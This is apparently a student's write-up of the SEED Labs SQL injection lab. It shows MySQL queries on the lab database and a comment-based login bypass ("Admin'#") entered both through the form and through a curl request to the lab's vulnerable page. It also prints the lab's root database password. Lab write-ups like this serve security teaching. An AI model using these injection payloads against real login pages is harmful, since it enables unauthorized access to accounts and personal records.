# Seed-Lab-Sql-Injection-Attack
SQL injection attack

|  Name   | Title |
| ------------- | ------------- |
| Asad Ali  | Seed Lab SQL Injection  |

Instruction: https://seedsecuritylabs.org/Labs_16.04/PDF/Web_SQL_Injection.pdf

# Task 1
### Login to MYSQL
```
sudo mysql -u root -pseedubuntu
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/mysql%20query.PNG)
### Use Users Database from Databases
```
mysql> use Users;
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/use%20users.PNG)
## Showing Tables from Users Database
```
mysql> show Tables;
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/show%20table.PNG)
## Select Name="Alice" from Users Database
```
mysql> select * from credential where Name = 'Alice';
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/select%20query.PNG)
# Task 2
## Task2.1
- Username ```"Admin'#"```
- Password ```"abc"```
It will result in a SQL query as:
```
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'Admin' #' and Password='abc'
```
Then statements after ```#``` will be regarded as comments. So we can log in as ```Admin```.

![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/users%20details.PNG)
## Task 2.2
```
curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
```
![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/use%20users.PNG)
